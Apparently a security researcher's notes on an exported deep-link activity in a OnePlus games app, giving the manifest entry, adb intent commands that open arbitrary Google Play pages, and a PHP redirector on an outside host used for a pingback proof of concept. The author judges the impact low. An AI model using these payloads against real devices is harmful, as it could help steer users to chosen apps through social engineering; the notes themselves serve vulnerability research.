# Description

## com.oplus.games.ExternalJumpActivity

**TL;DR** I found ways to open arbitrary packages in Google Play. Also pingback to an arbitrary HTTP service is possible, but it can only be used to cirle back to Google Play. I don’t really see any way forward here. Good effort though.

```xml
<activity android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" android:name="com.oplus.games.ExternalJumpActivity" android:exported="true" android:screenOrientation="portrait">
	<intent-filter>
		<action android:name="android.intent.action.VIEW" />
		<category android:name="android.intent.category.DEFAULT" />
		<category android:name="android.intent.category.BROWSABLE" />
		<data android:scheme="app" android:host="com.oplus.games" android:pathPrefix="/jump" />
	</intent-filter>
</activity>
```

  This activity allows to ope arbitrary apps in Google Play. It seems by design and I don’t see any impact in this behavior itself. Even if there isn’t a possibility to just do it directly with Google Play intents (or https links), best one can do is social engineering I guess.

Working payload to open Google Play for arbitrary app

```bash
adb shell am start -a android.intent.action.VIEW \
-d "app://com.oplus.games/jump?url=https%3a//play.googles.com/store/apps/details%3fid%3dpl.com.insert.gestormobile%26pcampaignid%3dweb_share%26_back_hand_%3dtest%26_source_stat_%3d{}" \
com.oneplus.gamespace
```

Here’s the payload that performs a pingback to an arbitrary HTTP service. It can be used to redirect(sic!) to an arbitrary Google Play package:

First, prepare a redirector:

```php
<?php
header("Location: market://details?id=pl.com.insert.gestormobile&referrer=", true, 301);
exit;
?>
```

Then run the PoC:

```bash

adb shell am start -a android.intent.action.VIEW \
-d "app://com.oplus.games/jump?url=https%3A%2F%2Ftellico.fun%2Foneplus.php%3Fonelink%3D1&pcampaignid=web_share&_back_hand_=test&_source_stat_={}" \
com.oneplus.gamespace
```

When working on it, I created and used [[root.research.frida.call-tracking]]